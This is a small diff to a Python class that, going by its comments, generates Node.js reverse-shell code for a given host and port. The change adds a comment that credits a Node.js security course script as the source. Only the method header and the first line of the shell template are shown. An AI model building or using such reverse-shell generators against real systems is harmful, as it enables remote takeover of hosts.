@@ -48,6 +48,7 @@ class CelestialBackConnect:
         return encoded[1:]
 
     # Generate the Node.JS reverse shell code using the specified host/port
+    # https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
     def generate_shellcode(self):
         shell_skeleton = '''
         var net = require('net');
